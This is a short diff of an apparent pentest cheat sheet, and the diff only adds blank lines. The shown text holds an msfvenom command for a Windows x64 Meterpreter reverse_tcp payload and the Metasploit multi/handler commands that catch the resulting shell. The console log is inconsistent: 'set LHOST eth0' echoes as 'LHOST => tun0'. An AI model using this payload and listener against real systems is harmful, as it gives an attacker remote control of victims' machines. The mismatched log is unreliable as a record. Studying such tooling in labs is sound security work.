@@ -37,12 +37,19 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=YOURPORT -e x
 
 ### [Handler]
 msf5 > use exploit/multi/handler
+
 msf5 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
 PAYLOAD => windows/x64/meterpreter/reverse_tcp
+
 msf5 exploit(multi/handler) > set LHOST eth0
+
 LHOST => tun0
+
 msf5 exploit(multi/handler) > set LPORT 32119
+
 LPORT => 32119
+
 msf5 exploit(multi/handler) > run
 
 https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom
